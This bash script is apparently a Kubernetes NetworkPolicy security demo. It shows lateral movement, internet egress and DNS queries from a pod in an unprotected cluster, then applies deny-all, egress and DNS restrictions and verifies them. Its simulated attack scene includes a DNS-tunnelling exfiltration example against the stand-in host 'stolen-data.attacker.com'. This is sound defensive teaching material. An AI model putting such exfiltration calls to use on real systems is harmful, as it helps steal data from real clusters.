#!/bin/bash

########################
# Network Policy Security Demo Module
# Demonstrates the danger of missing network policies
########################

demo_networkpolicy() {
    local MODULE_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
    local REPO_ROOT="$(dirname "$(dirname "$MODULE_DIR")")"
    local EXAMPLES_DIR="${REPO_ROOT}/networkpolicy/examples"

    #############################################
    # SCENE 1: The Mistake (Broken)
    #############################################

    clear
    section_header "Network Policy: The Mistake 💥" "${RED}"
    echo
    info "A team deploys applications without any NetworkPolicy..."
    info "Kubernetes default: ALL traffic is allowed!"
    echo

    # Change to examples directory to use shorter paths
#    p "cd networkpolicy/examples"
    cd "${EXAMPLES_DIR}"
    echo

    info "Demo pods were pre-created during cluster setup..."
    echo
    info "Let's look at what we have deployed..."
    echo
    pe "cat demo-pods.yaml"
    echo
    wait

    clear
    info "Checking the pods..."
    echo
    pe "kubectl get pods -n demo-app"
    pe "kubectl get pods -n demo-sensitive"
    echo
    wait

    info "Checking for NetworkPolicies..."
    pe "kubectl get networkpolicies -A"
    echo
    danger "No NetworkPolicies found - everything is wide open!"
    echo
    wait
    sleep 1

    #############################################
    # SCENE 2: The Impact (What This Means)
    #############################################

    clear
    section_header "Network Policy: Understanding the Impact 🔍" "${YELLOW}"
    echo
    info "Without NetworkPolicies, pods can communicate with ANYTHING..."
    echo
    wait

    info "Test 1: Can we access pods in other namespaces?"
    pe "kubectl exec -n demo-app client-pod -- curl -s -m 3 sensitive-service.demo-sensitive.svc.cluster.local"
    echo
    danger "YES - Cross-namespace access works!"
    echo
    wait

    clear
    info "Test 2: Can we access external websites?"
    pe "kubectl exec -n demo-app client-pod -- curl -s -m 3 -I google.com | head -1"
    echo
    danger "YES - Internet access unrestricted!"
    echo
    wait

    clear
    info "Test 3: Can we make unrestricted DNS queries?"
    pe "kubectl exec -n demo-app client-pod -- nslookup google.com | grep -A2 'Name:'"
    echo
    danger "YES - DNS queries unrestricted (DNS tunneling possible)!"
    echo
    wait
    sleep 1

    #############################################
    # SCENE 3: The Attack (Simulated)
    #############################################

    clear
    section_header "Network Policy: The Attack Scenario 🎭" "${RED}"
    echo
    danger "An attacker compromises the client-pod..."
    danger "They can now move laterally and exfiltrate data!"
    echo
    wait

    danger "Attack 1: Lateral Movement - Access sensitive namespace"
    echo
    pe "kubectl exec -n demo-app client-pod -- curl -s sensitive-service.demo-sensitive.svc.cluster.local | grep '<title>'"
    echo
    danger "Attacker accessed the 'database' in demo-sensitive namespace!"
    echo
    wait

    danger "Attack 2: Data Exfiltration - Contact external server"
    echo
    pe "kubectl exec -n demo-app client-pod -- curl -s -I https://example.com | head -3"
    echo
    danger "Attacker can send stolen data to external server!"
    echo
    wait

    danger "Attack 3: DNS Tunneling - Exfiltrate via DNS queries"
    echo
    pe "kubectl exec -n demo-app client-pod -- nslookup stolen-data.attacker.com 2>&1 | head -3"
    echo
    danger "Attacker can attempt to tunnel data through DNS queries!"
    echo
    danger "🚨 NO NETWORK ISOLATION - COMPLETE LATERAL MOVEMENT 🚨"
    echo
    wait
    sleep 1

    #############################################
    # SCENE 4: The Fix (Implementing Network Policies)
    #############################################

    clear
    section_header "Network Policy: The Fix ✅" "${GREEN}"
    echo
    success "Let's implement proper network segmentation..."
    echo

    info "Step 1: Apply default deny-all policy"
    echo
    pe "cat defaultdenyall.yaml"
    echo
    wait

    clear
    kubectl apply -f defaultdenyall.yaml -n demo-app
    echo
    success "All traffic in demo-app namespace is now blocked by default!"
    echo
    wait

    info "Step 2: Allow only necessary internal traffic"
    echo
    pe "cat allow-internal.yaml"
    echo
    wait

    clear
    kubectl apply -f allow-internal.yaml
    echo
    success "Allowed client → server communication within namespace"
    echo
    wait

    info "Step 3: Restrict egress to internal network only"
    echo
    pe "cat restrictegress.yaml | head -20"
    echo
    info "This policy allows egress only to cluster internal IPs (10.0.0.0/8)"
    echo
    wait

    clear
    kubectl apply -f restrictegress.yaml -n demo-app
    echo
    success "Egress locked to internal network only!"
    echo
    wait

    info "Step 4: Restrict DNS to CoreDNS only"
    echo
    pe "cat restrictdns.yaml | head -20"
    echo
    wait

    clear
    kubectl apply -f restrictdns.yaml -n demo-app
    echo
    success "DNS restricted to kube-system CoreDNS only!"
    echo
    wait
    sleep 1

    #############################################
    # SCENE 5: The Result (Verification)
    #############################################

    clear
    section_header "Network Policy: Verifying the Fix 🔒" "${GREEN}"
    echo
    success "Now let's verify the attacks are blocked..."
    echo
    wait

    info "Test 1: Can we still access our internal server? (Should work)"
    pe "kubectl exec -n demo-app client-pod -- curl -s -m 3 server-service.demo-app.svc.cluster.local | grep '<title>'"
    echo
    success "Internal communication still works!"
    echo
    wait

    clear
    info "Test 2: Can we access external websites? (Should be blocked)"
    pe "kubectl exec -n demo-app client-pod -- curl -s -m 3 --connect-timeout 1 google.com || echo 'BLOCKED ✓'"
    echo
    success "External internet access blocked!"
    echo
    wait

    clear
    info "Test 3: Can we query arbitrary DNS servers? (Should be blocked)"
    pe "kubectl exec -n demo-app client-pod -- timeout 1 nslookup google.com 8.8.8.8 2>&1 || echo 'BLOCKED ✓'"
    echo
    success "Arbitrary DNS queries blocked!"
    echo
    wait

    clear
    section_header "Network Policy: Summary 📋" "${CYAN}"
    echo
    success "✅ Applied default deny-all policy"
    success "✅ Allowed only necessary internal traffic"
    success "✅ Blocked cross-namespace lateral movement"
    success "✅ Blocked external data exfiltration"
    success "✅ Blocked DNS tunneling attacks"
    success "✅ Restricted egress to internal network only"
    echo
    success "🎯 Network segmentation properly implemented!"
    success "   Even if compromised, attacker is isolated to minimal network access"
    echo
    wait

    #############################################
    # Cleanup
    #############################################

#    info "Cleaning up network policy demo resources..."
    # Only cleanup the network policies created during the demo
    # Demo pods are NOT deleted as they were created during cluster setup
    kubectl delete -f defaultdenyall.yaml -n demo-app --ignore-not-found=true &>/dev/null
    kubectl delete -f allow-internal.yaml --ignore-not-found=true &>/dev/null
    kubectl delete -f restrictegress.yaml -n demo-app --ignore-not-found=true &>/dev/null
    kubectl delete -f restrictdns.yaml -n demo-app --ignore-not-found=true &>/dev/null
#    success "Done"
    echo

    # Return to original directory
    cd - &>/dev/null
}
